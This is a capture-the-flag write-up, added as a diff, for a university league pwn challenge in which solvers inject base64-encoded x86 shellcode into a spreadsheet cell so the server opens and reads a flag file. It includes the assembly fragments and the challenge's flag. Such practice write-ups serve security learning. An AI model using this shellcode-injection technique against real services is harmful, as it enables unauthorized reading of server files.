@@ -1,0 +1,66 @@
+NAME: deadsheets
+CATEGORY: pwn
+POINTS: 300
+DOWNLOAD LINK: http://chal.ctf-league.osusec.org/deadsheets.tar.gz
+ACCESS: http://chal.ctf-league.osusec.org:1353/
+DESCRIPTION: Greetings and salutations, cyber-sleuths and code-crackers! Do you fancy yourself a master of the matrix, a wizard of the web, or a guru of the code? Well, hold on to your hats because we've got a challenge that will have you hacking your way to glory!
+
+Introducing our latest cybersecurity CTF challenge, where you'll be diving headfirst into the depths of a custom "dead" database - yes, you heard that right, DEAD as in Dangerously Extensible Ancient Database! Now, this might sound like a graveyard for your cyber-skills, but don't let the name fool you. This database is so ancient and terrible that it has more holes than Swiss cheese! And your task, dear challengers, is to find those holes and exploit them like a boss!
+
+But wait, there's more! Our challenge involves a spreadsheet website where you'll have to inject some shellcode to make the backend server dance to your tune. Think you've got what it takes to make that happen? Well, it's not going to be easy, but with some clever shellcode and a lot of tenacity, you just might be able to hack your way to the coveted flag file!
+
+So, dust off your hacking tools, flex those cyber-muscles, and get ready to take on this challenge like a pro. It's time to show the cyber-world what you're made of!
+
+This challenge consisted of just writing some shellcode, that would then be run in the
+spreadsheet cell in the provided website. The purpose of the code was also pretty simple:
+open and read the flag file, and return its contents
+
+pwntools has some handy functions to create shellcode out of assembly instructions, which
+also makes our job considerably easier. 
+
+We broke the assembly code into four pieces:
+	- push registers onto the stack
+	- open the file
+	- read the file
+	- pop registers and return
+
+The first and last parts are simple:
+	push ebx
+    push ecx
+    push edx
+	
+	//code
+	
+	mov eax, {address + shellcode_len}
+    pop edx
+    pop ecx
+    pop ebx
+    ret
+where {address + shellcode_len} is the offset of the shellcode plus its length. The program,
+when you run it, very kindly hands us the offset, and we set the shellcode_len to 0x50.
+
+Now it's time to look up the syscall table to see how to set up the read and the open. 
+For opening, the syscall code is 0x05, stored in eax, then the pointer to the file in 
+ebx, and we left the other two registers as 0. int 0x80 is the interrupt signal to 
+call the function:
+	mov eax, 0x05
+    mov ebx, {address + shellcode_len}
+    mov ecx, 0
+    mov edx, 0
+    int 0x80
+
+The read call code is 0x03, then ebx stores the file descriptor (since no other files were open
+at the time, and 0, 1, and 2 are for stdin/out/err, the next available descriptor was 3), ecx 
+has the buffer, and edx has the size. Since we didn't know the size, we just put a large value to
+read the whole file: 
+	mov eax, 0x03
+    mov ebx, 3
+    mov ecx, {address + shellcode_len}
+    mov edx, 100000
+    int 0x80
+
+Putting the parts together into a payload, then filling the rest of the buffer with A's and 
+encoding it with base64 gave us the payload to stick into the spreadsheet cell. After refreshing
+the page, the flag had appeared!!!
+
+	osu{53cur17y_15_0v3rr473d}
